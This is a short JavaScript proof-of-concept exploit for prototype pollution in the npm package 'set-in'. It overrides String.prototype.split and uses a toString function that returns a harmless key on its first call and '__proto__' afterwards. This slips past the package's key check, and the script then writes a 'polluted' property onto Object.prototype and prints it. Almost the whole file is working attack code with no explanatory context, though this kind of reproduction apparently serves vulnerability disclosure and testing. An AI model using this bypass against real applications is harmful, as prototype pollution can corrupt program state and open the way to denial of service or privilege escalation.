var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const si = require('set-in');
const obj = {};
console.log({}.polluted);
si(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');